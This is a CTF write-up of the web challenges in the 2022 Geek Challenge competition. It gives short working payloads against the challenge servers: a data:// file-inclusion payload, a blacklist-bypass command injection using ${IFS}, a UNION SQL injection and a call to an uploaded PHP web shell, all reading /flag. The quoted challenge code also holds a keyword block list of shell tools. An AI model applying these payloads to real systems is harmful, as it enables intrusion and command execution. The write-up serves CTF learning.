---
title: "2022 极客大挑战 Web Writeup"
date: 2022-10-25T10:09:14+08:00
lastmod: 2022-10-25T10:09:14+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## L0veSyc

flag 在 www.sycsec.com 官网

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251031657.png)

## Can Can Need

这题对于新生赛来说出的很不错, 扔掉了被用烂了的 xff 头, 同时加入了 From 头 (当然搜一下就能找到)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251035495.png)

## ezR_F_I

```
http://121.5.62.30:7005/include.php?file=data://text/plain,<?php system('cat /flag');?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251032433.png)

## ezrce

```php
<?php
highlight_file(__FILE__);

/*
......
*/

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
   
   if(preg_match("/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\"|\'| |\/|<|>|\\|/i", $ip,$match)) {
        die("hacker!");
    } else{
    system("ping -c 3 $ip");
    }
}
```

```
http://121.5.62.30:7006/?ip=1;ca\t${IFS}may_b3_y0u_can_pr0t3ct*
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251034609.png)

## 来发个包

右键注释

```javascript
window.onload = function(){
    var btn = document.getElementById('btn');
    btn.onclick = function(){
        var uname = document.getElementById('ifflag').value;
            var xhr = new XMLHttpRequest();
        var param = 'ifffflag='+uname;
        xhr.open('post','flag.php',true);
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.send(param);
        xhr.onreadystatechange = function(){
            if(xhr.readyState == 4){
                if(xhr.status == 200){
                    alert(xhr.responseText);
                }
            }
        }

    }
}
```

构造 http 包

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251037649.png)

## WelcomeSQL

```
http://120.77.11.65:8100/?id=-1 union select 1,group_concat(secret) from user_info
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251040736.png)

## babyupload

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210251042057.png)

```
http://121.5.62.30:7009/upload/16666656892.php?a=system('cat /flag');
```

